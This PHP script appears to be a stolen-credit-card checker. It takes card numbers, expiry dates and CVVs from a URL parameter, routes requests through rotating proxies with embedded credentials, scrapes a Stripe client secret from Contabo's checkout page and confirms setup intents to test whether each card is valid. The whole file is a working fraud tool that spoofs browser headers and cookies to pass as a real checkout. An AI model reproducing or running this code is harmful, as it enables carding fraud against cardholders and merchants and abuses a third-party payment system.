<?php

$proxie = 'http://p.webshare.io:80';
$pass = 'kzdeknxk-rotate:n1yai0b7ldc6';


$passOptions = [
    'rvpoydac-rotate:um0wzobkke09',
    'zwvccpuz-rotate:0ggj0crja35e',
    'yzdiiyzb-rotate:wgrrjdqfwmin',
    'kzdeknxk-rotate:n1yai0b7ldc6',
    'nwmrbfxp-rotate:kl8tmri1khw3',
    'hdipbdjs-rotate:514nojlreyiy',
];

$pass = $passOptions[array_rand($passOptions)];

$lista = $_GET['lista'];

$components = explode("|", $lista);

$cc = $components[0];
$mes = $components[1];
$ano = $components[2];
$cvv = $components[3];

$mes = ltrim($mes, '0');
$ano = strlen($ano) == 2 ? '20' . $ano : $ano;





function validateCreditCard($cc, $cvv, $mes, $ano)
{
    $validCards = [
        '4' => ['length' => 16, 'cvvLength' => 3],
        '5' => ['length' => 16, 'cvvLength' => 3],
        '6' => ['length' => 16, 'cvvLength' => 3],
        '3' => ['length' => 15, 'cvvLength' => 4],
    ];

    $currentMonth = date('m');
    $currentYear = date('Y');

    $ccFirstDigit = substr($cc, 0, 1);

    if (
        !isset($validCards[$ccFirstDigit]) ||
        strlen($cc) !== $validCards[$ccFirstDigit]['length'] ||
        strlen($cvv) !== $validCards[$ccFirstDigit]['cvvLength']
    ) {
         $errorMessage = "⚠ Credit card is invalid";
         echo '"message": "'.$errorMessage.'"';
         exit();
    }

    $expirationDate = DateTime::createFromFormat('Y-m', $ano . '-' . $mes);
    $currentDate = new DateTime();

    if ($expirationDate < $currentDate) {
        $errorMessage = "⚠ Expiration date is invalid. Please use a valid date.";
        echo '"message": "'.$errorMessage.'"';
        exit();
    }
}

echo "$cc, $mes, $ano, $cvv";

validateCreditCard($cc, $cvv, $mes, $ano);


if(empty($cvv)){
    exit('erro list');
}


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://contabo.com/en/api/page-data/payment.json');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_PROXY, $proxie);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $pass);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'authority: contabo.com',
    'accept: */*',
    'accept-language: es-ES,es;q=0.9',
    'referer: https://contabo.com/en/checkout/payment',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-origin',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
]);
curl_setopt($ch, CURLOPT_COOKIE, 'firstVisit=Sun, 13 Aug 2023 14:55:40 GMT; _fbp=fb.1.1691938774309.606957553; _hjFirstSeen=1; _hjIncludedInSessionSample_2086874=0; _hjSession_2086874=eyJpZCI6ImZlYTM4ZmJlLTU0MTQtNDJmOS1hY2Y1LThjY2YyNmU4NjViZCIsImNyZWF0ZWQiOjE2OTE5Mzg3NzkyNzAsImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=1; ln_or=eyIxOTAxOTU0IjoiZCJ9; _clck=x390q0|2|fe4|0|1320; _hjSessionUser_2086874=eyJpZCI6ImM4NWM1ZTMwLTVmZjctNWNiYS04M2NlLTAxNzU3MTkxNTM3YiIsImNyZWF0ZWQiOjE2OTE5Mzg3NzkyNTIsImV4aXN0aW5nIjp0cnVlfQ==; _uetsid=01d1c36039ea11eeade86b9a2f4d64e1; _uetvid=01d30fe039ea11eeb554611a37e1b1ae; _ga=GA1.2.2017572768.1691938735; _gid=GA1.2.784068173.1691938929; _gcl_au=1.1.1287405260.1691938951; _gat_UA-15403346-5=1; vat={"vatRate":0,"cc":"PE","currency":"USD"}; _ga_YFPNZBGTF3=GS1.1.1691938735.1.1.1691939145.60.0.0; _clsk=140euas|1691939146556|8|1|w.clarity.ms/collect');

$r1 = curl_exec($ch);
curl_close($ch);

#echo $r1.'<br>';

$data = json_decode($r1, true);

$stripeClientSecret = $data[2]['stripe_client_secret'];

$pos = strpos($stripeClientSecret, "_secret_");

$seti = substr($stripeClientSecret, 0, $pos);


#echo "[$stripeClientSecret][$seti]<hr>";

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://api.stripe.com/v1/setup_intents/$seti/confirm");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_PROXY, $proxie);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $pass);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'authority: api.stripe.com',
    'accept: application/json',
    'accept-language: es-ES,es;q=0.9',
    'content-type: application/x-www-form-urlencoded',
    'origin: https://js.stripe.com',
    'referer: https://js.stripe.com/',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-site',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
]);
curl_setopt($ch, CURLOPT_POSTFIELDS, "payment_method_data[type]=card&payment_method_data[card][number]=$cc&payment_method_data[card][cvc]=$cvv&payment_method_data[card][exp_month]=$mes&payment_method_data[card][exp_year]=$ano&payment_method_data[billing_details][address][postal_code]=33010&payment_method_data[guid]=NA&payment_method_data[muid]=NA&payment_method_data[sid]=NA&payment_method_data[pasted_fields]=number&payment_method_data[payment_user_agent]=stripe.js%2F814c622cf5%3B+stripe-js-v3%2F814c622cf5%3B+card-element&payment_method_data[time_on_page]=57896&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_51HH2BIDecjLsXqEKPxG7aAFTODSe38BxMf9s7icV8Iw7YGP1yA5xRlApyqciUNRLJ0lLACi7Ih2gEchTgeG4QWDx00y2QL6xWD&client_secret=$stripeClientSecret");

$r2 = curl_exec($ch);

curl_close($ch);

echo $r2;
